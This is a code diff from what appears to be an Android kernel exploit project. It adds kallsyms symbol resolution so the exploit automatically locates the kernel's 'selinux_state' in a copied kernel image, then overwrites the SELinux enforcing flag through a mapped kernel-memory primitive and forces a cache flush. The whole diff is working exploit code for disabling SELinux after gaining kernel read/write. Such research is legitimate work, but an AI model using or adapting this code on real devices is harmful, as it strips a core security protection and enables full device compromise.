@@ -565,6 +565,9 @@ int cheese_shutdown(struct cheese_gpu_rw* cheese) {
     return 0;
 }
 
+#define KALLSYMS_LOOKUP_INCLUDE
+#include "kallsyms_lookup.c"
+
 int main() {
     g_level1_dcache_size = tu_get_l1_dcache_size();
 #if 1
@@ -585,21 +588,30 @@ int main() {
     uint64_t kernel_size = *kernel_size_ptr;
     void* kernel_physical_base = ksma_mapping - ksma_physical_base + 0xa8000000;
 
-#if 0
     void* kernel_copy_buf = malloc(kernel_size);
     memcpy(kernel_copy_buf, kernel_physical_base, kernel_size);
+#if 0
     FILE* f = fopen("/data/local/tmp/kernel_dump", "w");
     fwrite(kernel_copy_buf, 1, kernel_size, f);
     fclose(f);
-    // now run something like vmlinux-to-elf/kallsyms-finder to get...
 #endif
+
+    struct cheese_kallsyms_lookup kallsyms_lookup;
+    if (cheese_create_kallsyms_lookup(&kallsyms_lookup, kernel_copy_buf, kernel_size)) {
+        return 1;
+    }
+
     // TODO(zhuowei): this is dumped from vmlinux-to-elf/kallsyms-finder on my computer and is specific to 51052260106700520 - need to auto detect this
-    uint64_t kernel_virtual_base = 0xffffffdc8b200000ull;
-    uint64_t kernel_selinux_state_addr = 0xffffffdc8dc02840ull;
+    uint64_t kernel_virtual_base = kallsyms_lookup.kallsyms_relative_base;
+    uint64_t kernel_selinux_state_addr = cheese_kallsyms_lookup(&kallsyms_lookup, "selinux_state");;
     bool* kernel_selinux_state_enforcing_ptr = kernel_physical_base + (kernel_selinux_state_addr - kernel_virtual_base);
     fprintf(stderr, "%lx: %p\n", (kernel_selinux_state_addr - kernel_virtual_base), kernel_selinux_state_enforcing_ptr);
     *kernel_selinux_state_enforcing_ptr = false;
-    // TODO(zhuowei): takes a second for it to take effect - need to flush CPU cache? or maybe need to map ksma with cache enabled?
+    __builtin___clear_cache((char*)kernel_selinux_state_enforcing_ptr, (char*)kernel_selinux_state_enforcing_ptr + 1);
+    // stupider cache flush...
+    void* garbage = malloc(0x1000000);
+    memset(garbage, 0x41, 0x1000000);
+    free(garbage);
 
     return 0;
 }
